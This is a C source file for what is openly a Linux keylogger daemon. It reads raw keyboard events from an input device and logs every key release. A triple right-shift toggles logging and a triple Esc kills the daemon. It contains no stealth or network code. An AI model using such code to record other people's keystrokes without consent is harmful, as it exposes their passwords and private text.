#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

#include "common.h"
#include "input-args.h"
#include "keylog.h"
#include "logger.h"
#include "error.h"

struct seq {
    unsigned short *keys;
    unsigned short size;
    unsigned short index;
};

static bool has_seq_triggered(unsigned short ev_code,
                              struct seq *seq)
{
    bool seq_triggered = false;

    if (ev_code == seq->keys[seq->index]) {
        seq->index++;

        if (seq->index == seq->size) {
            seq->index = 0;
            seq_triggered = true;
        }
    } else {
        seq->index = 0;
    }

    return seq_triggered;
}

void keyloggerd(cmd_args_t cmd_args)
{
    int keyboard;

    /* Hardcode the input device for now... */
    if ((keyboard = open(cmd_args.keyboard_device, O_RDONLY)) == ERROR) {
        logger.error("Failed to open keyboard device %s: %s",
                     cmd_args.keyboard_device, strerror(errno));
        return;
    }

    /*
     * Structure definition:
     *
     * struct input_event {
     *    struct timeval time;
     *    unsigned short type;
     *    unsigned short code;
     *    unsigned int value;
     * }
     */
    struct input_event ev;
    enum ev_value {
        RELEASED,
        PRESSED,
        REPEATED,
    };

    ssize_t n;
    keylog_t *kl;

    kl = create_keylog(cmd_args);

    /*
     * The sequence of keys to start and stop the key logger
     */
    static unsigned short start_stop_keys[] = {
        KEY_RIGHTSHIFT, KEY_RIGHTSHIFT, KEY_RIGHTSHIFT
    };

    /*
     * The sequence of keys to kill the keylogger daemon
     */
    static unsigned short kill_keys[] = {
        KEY_ESC, KEY_ESC, KEY_ESC
    };

    struct seq start_stop_seq = {
        .keys = start_stop_keys,
        .size = ARRAY_SIZE(start_stop_keys),
        .index = 0
    };

    struct seq kill_seq = {
        .keys = kill_keys,
        .size = ARRAY_SIZE(kill_keys),
        .index = 0
    };

    bool log_key_enabled = true;

    kl->open(kl);

    while (1) {
        n = read(keyboard, &ev, sizeof(ev));

        if (n > 0) {
            if (ev.type == EV_KEY && ev.value == RELEASED) {
                if (log_key_enabled) {
                    kl->log(kl, ev);
                }

                if (has_seq_triggered(ev.code, &start_stop_seq)) {
                    log_key_enabled = !log_key_enabled;

                    if (log_key_enabled) {
                        logger.warn("Key logging enabled");
                    } else {
                        logger.warn("Key logging disabled");
                    }
                }

                if (has_seq_triggered(ev.code, &kill_seq)) {
                    logger.warn("Magic kill switch sequence pressed");
                    break;
                }
            }
        } else {
            if (errno == EINTR) {
                continue;
            } else {
                logger.error("Failed to read bytes: %s", strerror(errno));
                break;
            }
        }
    }

    kl->close(kl);

    destroy_keylog(kl);
}
